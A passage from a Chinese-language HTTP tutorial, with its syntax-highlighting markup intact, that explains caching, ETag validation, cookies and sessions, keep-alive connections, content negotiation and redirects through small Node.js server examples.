punctuation">(</span><span class="token number">8887</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'server listening on 8887'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20210124193709754.png" alt=""></p><p><img src="image-20210124191947363.png" alt="从服务器获取script.js"></p><p><img src="image-20210124192758176.png" alt="再次刷新后从缓存读取"></p><p>问题：我们希望服务端更新了内容之后，客户端也能更新而不是读取的客户端的缓存</p><p>解决方法：在打包完成后会在js文件名上根据打包完成的js文件以及其他的静态资源文件的内容加上一段hash码，如果js文件或者静态资源文件内容不变，hash码就不会变。也就是当url没有变就会使用本地的静态资源缓存，如果所有js文件或者静态资源文件内容变化了，那么嵌入到这些资源的url路径的hash码就会发生变化，这样客户端就会发起新的请求。</p><p>​<br>​</p><h3 id="2-4-资源验证">2.4 资源验证</h3><img src="image-20210124195304725.jpg" alt="浏览器资源验证流程" style="zoom:130%;"><p><strong>验证头：</strong></p><ul><li>Last-Modified：上次修改时间，配合If-Modifie-Since或者If-Unmodified-Since使用，比对上次修改时间以验证资源是否需要更新</li></ul><blockquote><p>​请求的资源有Last-Modified，浏览器在下次请求的时候就会带上Last-Modified，服务器就读取Header中If-Modifie-Since的值来对比资源存在的地方，最后来对比上次修改的时间，如果时间是一样的代表资源还没有被重新修改过，服务器就告诉浏览器可以直接使用这个缓存</p></blockquote><ul><li>Etag：数据签名，资源发生了改变它的数据签名就会改变；配合If-Match或者If-Non-Match使用，对比资源的签名判断是否使用缓存</li></ul><p>示例代码</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> http <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'http'</span><span class="token punctuation">)</span><span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span>http<span class="token punctuation">.</span><span class="token function">createServer</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">request<span class="token punctuation">,</span> response</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'request come'</span><span class="token punctuation">,</span> request<span class="token punctuation">.</span>url<span class="token punctuation">)</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>request<span class="token punctuation">.</span>url <span class="token operator">===</span> <span class="token string">'/'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> html <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'test.html'</span><span class="token punctuation">,</span> <span class="token string">'utf8'</span><span class="token punctuation">)</span>    response<span class="token punctuation">.</span><span class="token function">writeHead</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>      <span class="token string">'Content-Type'</span><span class="token operator">:</span> <span class="token string">'text/html'</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>    response<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>request<span class="token punctuation">.</span>url <span class="token operator">===</span> <span class="token string">'/script.js'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">const</span> etag <span class="token operator">=</span> request<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'if-none-match'</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>etag <span class="token operator">===</span> <span class="token string">'777'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      response<span class="token punctuation">.</span><span class="token function">writeHead</span><span class="token punctuation">(</span><span class="token number">304</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>        <span class="token string">'Content-Type'</span><span class="token operator">:</span> <span class="token string">'text/javascript'</span><span class="token punctuation">,</span>        <span class="token string">'Cache-Control'</span><span class="token operator">:</span> <span class="token string">'max-age=2000000, no-cache'</span><span class="token punctuation">,</span>        <span class="token string">'Last-Modified'</span><span class="token operator">:</span> <span class="token string">'123'</span><span class="token punctuation">,</span>        <span class="token string">'Etag'</span><span class="token operator">:</span> <span class="token string">'777'</span>      <span class="token punctuation">}</span><span class="token punctuation">)</span>      response<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>      response<span class="token punctuation">.</span><span class="token function">writeHead</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>        <span class="token string">'Content-Type'</span><span class="token operator">:</span> <span class="token string">'text/javascript'</span><span class="token punctuation">,</span>        <span class="token string">'Cache-Control'</span><span class="token operator">:</span> <span class="token string">'max-age=2000000, no-cache'</span><span class="token punctuation">,</span>        <span class="token string">'Last-Modified'</span><span class="token operator">:</span> <span class="token string">'123'</span><span class="token punctuation">,</span>        <span class="token string">'Etag'</span><span class="token operator">:</span> <span class="token string">'777'</span>      <span class="token punctuation">}</span><span class="token punctuation">)</span>      response<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'console.log("script loaded twice")'</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">8887</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'server listening on 8887'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20210124201729755.png" alt="设置资源验证"></p><p><img src="image-20210124202044063.png" alt="返回304"></p><p><img src="image-20210124202633019.png" alt="缓存读取"></p><p>​<br>​</p><h3 id="2-5-Cookie和Session">2.5 Cookie和Session</h3><h4 id="2-5-1-cookie">2.5.1 cookie</h4><ul><li>通过Set-Cookie设置，保存在浏览器中</li><li>下次在同域的请求中自动带上</li><li>键值对，可以设置多个</li></ul><h4 id="2-5-2-cookie属性">2.5.2 cookie属性</h4><ul><li>max-age和expires设置过期时间</li><li>Secure只在https的时候发送</li><li>HttpOnly无法通过document.cookie访问（安全性）</li></ul><p>示例代码：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> http <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'http'</span><span class="token punctuation">)</span><span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span>http<span class="token punctuation">.</span><span class="token function">createServer</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">request<span class="token punctuation">,</span> response</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'request come'</span><span class="token punctuation">,</span> request<span class="token punctuation">.</span>url<span class="token punctuation">)</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>request<span class="token punctuation">.</span>url <span class="token operator">===</span> <span class="token string">'/'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> html <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'test.html'</span><span class="token punctuation">,</span> <span class="token string">'utf8'</span><span class="token punctuation">)</span>    response<span class="token punctuation">.</span><span class="token function">writeHead</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>      <span class="token string">'Content-Type'</span><span class="token operator">:</span> <span class="token string">'text/html'</span><span class="token punctuation">,</span>      <span class="token string">'Set-Cookie'</span><span class="token operator">:</span> <span class="token string">'id=123'</span>      <span class="token comment">//'Set-Cookie': ['id=123', 'abc=456'] 可以设置多个CooKie</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>    response<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">8887</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'server listening on 8887'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>X-UA-Compatible<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ie=edge<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>Document<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span>Content<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>开启服务</p><p><img src="image-20210125140602729.png" alt="查看cookie"></p><blockquote><p>如果Cookie没有设置过期时间，在浏览器关闭后就没有了</p></blockquote><p>设置HttpOnly属性</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">response<span class="token punctuation">.</span><span class="token function">writeHead</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>    <span class="token string">'Content-Type'</span><span class="token operator">:</span> <span class="token string">'text/html'</span><span class="token punctuation">,</span>    <span class="token string">'Set-Cookie'</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">'id=123; max-age=2'</span><span class="token punctuation">,</span> <span class="token string">'abc=456;HttpOnly'</span><span class="token punctuation">]</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span>response<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20210125141908195.png" alt="abc=456被禁止访问"></p><p>设置domain</p><blockquote><p>​不同域名的cookie是不能共享的，不过我们可以设置domain来实现所有的二级域可以读到一级域的cookie。（有更好的方式)</p></blockquote><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// const host = request.headers.host</span><span class="token keyword">if</span><span class="token punctuation">(</span>host <span class="token operator">===</span> <span class="token string">'test.com'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  response<span class="token punctuation">.</span><span class="token function">writeHead</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span><span class="token punctuation">{</span>     <span class="token string">'Content-type'</span><span class="token operator">:</span><span class="token string">'text/html'</span><span class="token punctuation">,</span>     <span class="token string">'Set-Cookie'</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">'id=123;max-age=2'</span><span class="token punctuation">,</span><span class="token string">'abc=345;domain=test.com'</span><span class="token punctuation">]</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意：不可以跨域设置domain</p><h4 id="2-5-2-session">2.5.2 session</h4><p>服务器创建session后，会把session的id以cookie的形式回写给客户机，这样，只要客户机的浏览器不关，再去访问服务器时，都会带着session的id号去，服务器发现客户机浏览器带session的id过来了，就会使用内存中与之对应的session为之服务。</p><blockquote><p>Session不等于Cookie</p></blockquote><h4 id="2-5-3-Session和Cookie的主要区别">2.5.3 Session和Cookie的主要区别</h4><ul><li>Cookie是把用户的数据写给用户的浏览器。</li><li>Session技术把用户的数据写到用户独占的session中。</li><li>Session对象由服务器创建，开发人员可以调用request对象的getSession方法得到session对象。</li></ul><p>​<br>​</p><h3 id="2-6-HTTP的长连接">2.6 HTTP的长连接</h3><p>  在HTTP/1.0中<strong>默认使用短连接</strong>。也就是说客户端和服务器每进行一次HTTP操作就建立一次连接，任务结束就中断连接。当客户端浏览器访问的某个HTML或其他类型的Web页中包含有其他的Web资源（如JavaScript文件、图像文件、CSS文件等），每遇到这样一个Web资源，浏览器就会重新建立一个HTTP会话。</p><p>  从HTTP/1.1起，默认使用长连接，用以保持连接特性。使用长连接的HTTP协议，会在响应头加入<code>Connection:keep-alive</code>。在使用长连接的情况下，当一个网页打开完成后，客户端和服务器之间用于传输HTTP数据的TCP连接不会关闭，客户端再次访问这个服务器时，会继续使用这一条已经建立的连接。</p><p>  实现长连接需要客户端和服务端都支持长连接。 HTTP协议的长连接和短连接，实质上是TCP协议的长连接和短连接。</p><ul><li><p>Connection:keep-alive：是可以复用TCP/IP的链接，不用每次发起一个请求就创建一个TCP/IP的链接（只有在同域下，这个TCP/IP的链接才可以复用）</p></li><li><p>Connection:close：每次发起请求就会创建一个TCP/IP链接，没有重复使用TCP/IP链接（每个连接的建立都是需要资源消耗和时间消耗的）</p></li></ul><p>示例代码：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> http <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'http'</span><span class="token punctuation">)</span><span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span>http<span class="token punctuation">.</span><span class="token function">createServer</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">request<span class="token punctuation">,</span> response</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'request come'</span><span class="token punctuation">,</span> request<span class="token punctuation">.</span>url<span class="token punctuation">)</span>  <span class="token keyword">const</span> html <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'test.html'</span><span class="token punctuation">,</span> <span class="token string">'utf8'</span><span class="token punctuation">)</span>  <span class="token keyword">const</span> img <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'test.jpg'</span><span class="token punctuation">)</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>request<span class="token punctuation">.</span>url <span class="token operator">===</span> <span class="token string">'/'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    response<span class="token punctuation">.</span><span class="token function">writeHead</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>      <span class="token string">'Content-Type'</span><span class="token operator">:</span> <span class="token string">'text/html'</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>    response<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    response<span class="token punctuation">.</span><span class="token function">writeHead</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>      <span class="token string">'Content-Type'</span><span class="token operator">:</span> <span class="token string">'image/jpg'</span><span class="token punctuation">,</span>      <span class="token string">'Connection'</span><span class="token operator">:</span> <span class="token string">'keep-alive'</span> <span class="token comment">// or close</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>    response<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>img<span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">8887</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'server listening on 8887'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>X-UA-Compatible<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ie=edge<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>Document<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/test1.jpg<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/test2.jpg<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/test3.jpg<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/test4.jpg<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/test5.jpg<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/test6.jpg<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/test7.jpg<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="image-20210125151346961.png" alt="查看Network" style="zoom:90%;"><img src="image-20210125152325682.png" alt="等待" style="zoom:90%;"><p>此时<code>Connection:keep-alive</code>，可以看到Chrome浏览器支持6个并发的连接，其他的图片在等待，等待有TCP连接空出来再发送请求</p><p>如果<code>Connection:close</code>,TCP连接不会复用，可以看到每个Connection ID都不一样</p><img src="image-20210125152745803.png" alt="短连接" style="zoom:90%;"><p>访问使用HTTP2的Google页面，发现只用了一个Connection ID</p><img src="image-20210125153633792.png" alt="" style="zoom:90%;"><blockquote><p>HTTP2可以信道复用，在TCP连接上可以并发的去发送http请求，链接一个网站只需要一个TCP链接(同域的情况下)</p></blockquote><p>参考文章：<a href="https://www.cnblogs.com/gotodsp/p/6366163.html">HTTP长连接、短连接</a></p><p>​<br>​</p><h3 id="2-7-数据协商">2.7 数据协商</h3><p>  在客户端发送给服务端一个请求时，会声明希望拿到的数据格式以及数据相关的一些限制，服务端会根据这个请求进行判断，返回不同的数据（服务端是根据客户端发送的请求头信息来进行区分，然后服务端决定返回怎么样的数据）</p><h4 id="请求">请求</h4><p><strong>Accept：</strong></p><ul><li>Accept：表示想要的数据类型</li><li>Accept-Encoding：代表数据使用什么样的编码方式进行传输</li><li>Accept-Language：实现不同的地方访问服务展示的语言不同</li><li>User-Agent：表示浏览器相关的信息，手机端的浏览器和PC端的浏览器是不一样的，可以通过User-Agent判断</li></ul><h4 id="返回">返回</h4><p><strong>Content：</strong></p><ul><li>Content-Type：对应Accept，Accept可以接收几种数据格式，Content-Type从其中选择一种</li><li>Content-Encoding：对应Accept-Encoding</li><li>Content-language：根据你的请求返回语言还是没有根据请求返回语言</li></ul><p><code>Content-Type</code></p><ul><li><p>application/x-www-form-urlencoded：数据被编码为名称/值对。这是标准的编码格式</p></li><li><p>multipart/form-data： 数据被编码为一条消息，页上的每个控件对应消息中的一个部分</p></li><li><p>text/plain： 数据以纯文本形式（text/json/xml/html）进行编码，其中不含任何控件或格式字符</p><p>…</p></li></ul><blockquote><p>当你想要设置你想要的数据时就通过设置Accept中的属性来达到，服务端就会根据你的请求来进行对应的请求</p></blockquote><p><img src="image-20210126153300531.png" alt=""></p><p>​<br>​</p><h3 id="2-8-Redirect">2.8 Redirect</h3><p>  我们通过url去访问一个路径，请求资源的时候，发现这个资源已经不在这个url指定的位置了，这时候服务器就会告诉客户端浏览器，请求的资源现在在那个地方，浏览器再去重新请求那个地方</p><p>通过服务器判断请求的路径来实现重定向到新的url，一般返回3**有几种状态：</p><ul><li>302（每次访问都需要通过旧的url再跳转到新的资源的URL上）</li><li>301（指定之前的资源的路径永久变成了新定义的资源路径，出现了之前路径访问的时候，直接在浏览器就会变成新的路径，就不需要服务器去指定一个新的location，因为是一个永久的变更；除非主动清除缓存，不然浏览器都会默认调整）</li></ul><p>示例代码</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> http <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'http'</span><span class="token punctuation">)</span>http<span class="token punctuation">.</span><span class="token function">createServer</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">request<span class="token punctuation">,</span> response</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'request come'</span><span class="token punctuation">,</span> request<span class="token punctuation">.</span>url<span class="token punctuation">)</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>request<span class="token punctuation">.</span>url <span class="token operator">===</span> <span class="token string">'/'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    response<span class="token punctuation">.</span><span class="token function">writeHead</span><span class="token punctuation">(</span><span class="token number">302</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>      <span class="token string">'Location'</span><span class="token operator">:</span> <span class="token string">'/new'</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>    response<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>request<span class="token punctuation">.</span>url <span class="token operator">===</span> <span class="token string">'/new'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    response<span class="token punctuation">.</span><span class="token function">writeHead</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>      <span class="token string">'Content-Type'</span><span class="token operator">:</span> <span class="token string">'text/html'</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>    response<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'&lt;div&gt;this is 